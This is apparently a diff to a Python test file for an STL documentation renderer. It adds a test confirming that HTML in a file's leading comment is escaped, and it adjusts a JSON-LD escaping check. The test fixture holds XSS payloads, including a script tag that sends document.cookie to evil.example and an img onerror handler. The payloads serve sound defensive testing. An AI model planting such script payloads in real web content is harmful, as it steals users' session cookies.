@@ -292,6 +292,25 @@ ns stl {
 
 # ---------- JSON-LD <script> safety ----------
 
+def test_file_description_angle_brackets_escaped(tmp_path):
+    """_extract_file_intro feeds {{ file_description }} which MyST renders raw.
+    A <script>/<img>/<iframe> in the leading file comment must be escaped."""
+    src = """\
+// This file does things.
+// <script>document.location='https://evil.example/?c='+document.cookie</script>
+// <img src=x onerror=alert(1)>
+// <iframe src=https://evil.example/x></iframe>
+
+ns stl { def loop {} }
+"""
+    render_stl(_mini_index(src, rel_path="runlib"), tmp_path)
+    page = (tmp_path / "runlib.md").read_text(encoding="utf-8")
+    assert "<script>" not in page
+    assert "<img" not in page
+    assert "<iframe" not in page
+    assert "&lt;script&gt;" in page or "script" not in page
+
+
 def test_json_ld_escapes_html_for_script_context():
     """Security unit test for the `</script>`-safe JSON-LD serialiser.
 
@@ -343,8 +362,9 @@ ns stl {
     # JSON-LD — any `<`/`>` here is a breakout from the block.
     assert "<" not in json_ld
     assert ">" not in json_ld
-    # The payload's angle brackets are present, but only escaped.
-    assert "\\u003c" in json_ld and "\\u003e" in json_ld
+    # The payload is present but escaped: HTML-escaping converts < to &lt;,
+    # then JSON serialisation escapes & to &, so the sequence is &lt;.
+    assert "\\u0026lt;" in json_ld
 
 
 # ---------- end-to-end against real STL ----------
